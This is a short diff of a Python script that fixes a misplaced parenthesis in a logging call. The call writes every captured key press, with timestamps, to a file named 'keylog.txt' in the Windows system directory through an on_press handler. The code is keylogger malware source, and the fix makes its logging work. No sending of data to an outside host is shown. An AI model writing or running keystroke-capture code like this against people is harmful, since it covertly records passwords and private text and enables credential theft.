@@ -8,7 +8,7 @@ log_dir = os.environ['WINDIR']
 print log_dir
 print os.access(log_dir,os.W_OK)
 
-logging.basicConfig(filename=os.path.join(log_dir,'keylog.txt',level=logging.DEBUG,format='%(asctime)s: %(message)s')
+logging.basicConfig(filename=os.path.join(log_dir,'keylog.txt'),level=logging.DEBUG,format='%(asctime)s: %(message)s')
 def on_press(key):
     logging.info(key)
 
